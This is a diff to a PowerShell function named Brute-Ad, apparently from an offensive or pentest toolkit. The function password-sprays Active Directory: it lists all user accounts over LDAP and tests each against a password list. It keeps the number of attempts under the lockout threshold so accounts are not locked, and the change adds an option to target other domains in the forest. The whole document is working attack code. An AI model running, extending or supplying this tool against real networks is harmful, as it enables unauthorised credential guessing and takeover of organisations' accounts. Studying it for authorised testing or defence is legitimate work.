@@ -15,6 +15,8 @@
 .EXAMPLE
     Brute-Ad -list Password1,password2,'$password$','$Pa55w0rd$',password12345
     The provided list will be used:  Password1 password2 $password$ $Pa55w0rd$ password12345
+.EXAMPLE
+    Brute-Ad -list Password1,password2 -domain test.ad.com
 
     Username        Password   IsValid
     --------        --------   -------
@@ -26,17 +28,21 @@ function Brute-Ad
 [cmdletbinding()]
 Param
 (
-		[string[]]$list
+		[string[]]$list,
+		$domain
 )
+	Write-Output ""
+	Write-Output "[+] Brute-ad module started"
+	Write-Output ""
     if ($list)
         {
         $allpasswords = $list
-        Write-Output -ForegroundColor Yellow 'The provided list will be used: '$allpasswords`n
+        Write-Output 'The provided list will be used: '$allpasswords`n
         }
         else
         {
         $allpasswords = @('Password1')
-        Write-Output -ForegroundColor Yellow 'The built-in list will be used: '$allpasswords`n
+        Write-Output 'The built-in list will be used: '$allpasswords`n
         }
 
 	Function Get-LockOutThreshold  
@@ -61,8 +67,7 @@ Param
 		$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
 		return $object
 	}
-
-	$domain = $env:USERDOMAIN
+	
 	$username = ''
 
 	$lockoutthres =  $lockout.'Account Lockout Threshold (Invalid logon attempts)'
@@ -80,15 +85,45 @@ Param
 	    $passwords = $allpasswords | Select-Object -First ($lockoutthres -=1)
 	}
 
-	$DirSearcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]'')
-    $DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
-	$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{ 
+	if (!$domain)
+	{
+		$domain = $env:USERDOMAIN
+		$DirSearcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]'')
+	    $DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
+		$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{ 
 
-	    $username = $_.Properties.samaccountname
-	    foreach ($password in $passwords) 
-	    {
-	    	$result = Test-ADCredential $username $password 
-	    	$result | Where {$_.IsValid -eq $True}
-	    }
+		    $username = $_.Properties.samaccountname
+		    foreach ($password in $passwords) 
+		    {
+		    	$result = Test-ADCredential -username $username -password $password -domain $domain
+		    	$result | Where {$_.IsValid -eq $True}
+		    }
+		}
+	} else {
+		$forest= [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+		$domainname= $forest.Domains | ? {$_.Name -like "$($domain)*"}
+		if ($domainname.Count -gt 1) {
+			echo "[-] More than one match for domain: *$($domain)*"
+			echo "Please use FQDN"
+			echo $domainname
+		} else {
+			$domainDN=$domainname.GetDirectoryEntry().distinguishedName 
+			$Searcher=New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$domainDN")
+			$Searcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
+			$domain = $domainname.name
+			$Searcher.FindAll().GetEnumerator() | ForEach-Object{ 
+
+			    $username = $_.Properties.samaccountname
+			    foreach ($password in $passwords) 
+			    {
+			    	$result = Test-ADCredential -username $username -password $password -domain $domain
+			    	$result | Where {$_.IsValid -eq $True}
+			    }
+			}
+		}
+
 	}
+
+	Write-Output ""
+	Write-Output "[+] Module completed"
 }
